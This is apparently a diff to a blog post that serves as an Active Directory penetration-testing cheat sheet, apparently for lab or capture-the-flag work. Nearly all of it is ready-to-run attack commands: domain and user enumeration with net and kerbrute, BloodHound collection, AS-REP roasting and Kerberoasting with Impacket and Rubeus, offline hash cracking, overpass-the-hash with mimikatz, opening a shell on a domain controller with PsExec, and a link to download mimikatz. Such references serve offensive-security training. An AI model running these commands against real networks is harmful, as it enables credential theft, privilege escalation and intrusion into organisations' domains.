@@ -8,7 +8,7 @@ layout: post
 ---
 
 
-###### Basic Domain Enumeration Commands
+###### A Few Basic Domain Enumeration Commands
 ```
 > net user /domain
 > net user some_admin /domain
@@ -33,7 +33,8 @@ First, gather the data with an ingestor, either the bloodhound-python script fro
 > (sudo) neo4j console
 starts on localhost:7687
 
-Example bloodhound-python:
+Examples bloodhound-python:
+> bloodhound-python -c All -u 'username' -p 'password' -d "domain.local" -ns 10.10.10.10
 > bloodhound-python -c All -u 'username' -p 'password' -gc "MACHINE.domain.local" -dc "MACHINE.domain.local" -d "domain.local" -ns 10.10.10.10
 
 Example SharpHound
@@ -73,11 +74,10 @@ https://github.com/ropnop/kerbrute
 ./kerbrute userenum --dc 10.10.10.10 -d domain.htb users.txt
 ```
 
-
 ###### Kerberos ~ AS-REP Roasting
 ```
 From external with Impacket:
-> impacket-GetNPUsers domain.local/ -format john -usersfile wordlist -no-pass -dc-ip 10.10.10.10
+> impacket-GetNPUsers domain.local/ -format john -usersfile users.txt -no-pass -dc-ip 10.10.10.10
 
 With Rubeus:
 > .\Rubeus.exe asreproast
@@ -92,30 +92,32 @@ or:
 ###### Kerberos ~ Kerberoasting
 ```
 From external with Impacket:
-> GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out
+> impacket-GetUserSPNs -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out
 
-With Rubeus:
+List TGT's:
+> klist
+
+Get a TGT with Rubeus:
+> .\Rubeus.exe asktgt /user:SYSTEM-NAME$ /rc4:h1a2s3h4 /ptt
+
+Kerberoasting With Rubeus:
 > .\Rubeus.exe kerberoast
 > .\Rubeus.exe kerberoast /user:username /domain:domain.local /format:hashcat /outfile:file.out
 
 Password dictionary attack:
-> hashcat -m 13100 -a 0 tgsfile.out /usr/share/wordlists/rockyou.txt --force
+> john tgs-file --wordlist=/usr/share/wordlists/rockyou.txt
 or:
-> python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
+> hashcat -m 13100 -a 0 tgsfile.out /usr/share/wordlists/rockyou.txt --force
 ```
 
-# To be improved:
 ###### Overpass the hash / Pass The Key
 ```
 Start powershell as the targeted user with mimikatz using the ntlm hash:
 > sekurlsa::pth /user:username /domain:domain.local /ntlm:h1a2s3h4 /run:PowerShell.exe
-using the powershell instance, authenticate to domain controller dc01 so a ticket is generated:
+using this powershell instance, authenticate to domain controller dc01 so a ticket is generated:
 > net use \\dc01
 Or open a shell on domain controller dc01:
 > PsExec.exe \\dc01 cmd.exe
-
-With Rubeus:
-> .\Rubeus.exe
 ```
 
 ###### More Kerberos attacks:
@@ -148,8 +150,10 @@ with Mimikatz:
 ###### Mimikatz ~ Retrieve stored credentials
 ```
 https://github.com/gentilkiwi/mimikatz
-
 > cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./
+
+Older Mimikatz version:
+https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip
 
 Start Mimikatz from CMD
 > .\mimikatz.exe
